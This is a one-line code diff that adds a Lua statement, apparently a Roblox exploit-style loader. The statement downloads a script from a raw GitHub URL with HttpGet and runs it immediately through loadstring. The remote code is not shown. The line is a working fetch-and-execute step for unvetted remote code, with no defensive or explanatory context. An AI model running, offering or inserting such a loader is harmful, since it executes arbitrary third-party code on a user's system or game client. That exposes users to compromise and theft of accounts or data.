@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WINVOLST/ttd/refs/heads/main/aw", true))()
